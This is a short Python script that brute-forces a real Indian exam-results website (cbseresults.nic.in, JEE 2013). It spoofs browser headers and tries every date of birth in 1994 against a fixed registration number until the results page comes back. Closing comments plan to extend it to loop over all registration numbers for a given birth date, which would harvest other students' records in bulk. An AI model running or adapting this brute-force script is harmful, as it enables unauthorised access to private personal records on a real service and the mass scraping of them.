import httplib2
from urllib import urlencode
h=httplib2.Http('.cache')
url="http://cbseresults.nic.in/jee/jee13_cbse.asp"
headers={'Connection': 'keep-alive','Origin': 'http://cbseresults.nic.in','Referer': 'http://cbseresults.nic.in/jee/jee_cbse_2013.htm','Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'}
day={'01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31'}
month={'01','02','03','04','05','06','07','08','09','10','11','12'}
year={'1994'}
for cyear in year:
	for cmonth in month:
		for cday in day:
			data={'regno':'82606019','dob':cday+'/'+cmonth+'/'+cyear,'b2':'Submit'}
			print urlencode(data)
			response, content = h.request(url,'POST',urlencode(data),headers)
			if(len(content)>4500):
				print response
				print content.decode('utf-8')
				
#have to add loop or text file for reg no
#have to break the loop after correct record has been received
#reverse the program so that at a particular dob all rem roll nos are brute-forced 
